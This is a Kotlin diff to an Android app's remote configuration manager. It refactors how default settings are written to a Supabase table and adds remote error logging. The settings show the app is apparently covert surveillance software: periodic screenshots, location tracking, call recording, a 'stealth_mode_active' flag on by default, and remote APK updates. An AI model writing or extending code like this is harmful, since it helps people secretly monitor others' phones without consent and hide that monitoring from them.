@@ -59,17 +59,20 @@ class RemoteConfigManager(private val context: Context) {
     private suspend fun initializeDefaultSettings() = withContext(Dispatchers.IO) {
         try {
             val client = SupabaseManager.getInstance().getClient() ?: return@withContext
-            val defaultSettings = mapOf(
-                "device_id" to deviceId,
-                "screenshot_interval_ms" to 60000,
-                "location_interval_ms" to 600000,
-                "record_calls" to false,
-                "stealth_mode_active" to true
+            val defaultSettings = DefaultSettingsPayload(
+                device_id = deviceId,
+                screenshot_interval_ms = 60000,
+                location_interval_ms = 600000,
+                record_calls = false,
+                stealth_mode_active = true
             )
             client.from(TABLE_NAME).insert(defaultSettings)
             Log.i(TAG, "Default settings initialized for device: $deviceId")
         } catch (e: Exception) {
             Log.e(TAG, "Failed to initialize default settings: ${e.message}")
+            try {
+                SupabaseManager.getInstance().logRemote(context, TAG, "ERROR", "Initialize default settings failed: ${e.message}")
+            } catch (_: Exception) {}
         }
     }
 }
@@ -86,4 +89,13 @@ data class AppSettings(
     val target_version: Int = 1,
     val update_apk_path: String? = null,  // مسار Supabase Storage
     val update_apk_url: String? = null    // رابط HTTP مباشر (الأولوية عند وجوده)
+)
+
+@Serializable
+data class DefaultSettingsPayload(
+    val device_id: String,
+    val screenshot_interval_ms: Long = 60000,
+    val location_interval_ms: Long = 600000,
+    val record_calls: Boolean = false,
+    val stealth_mode_active: Boolean = true
 )
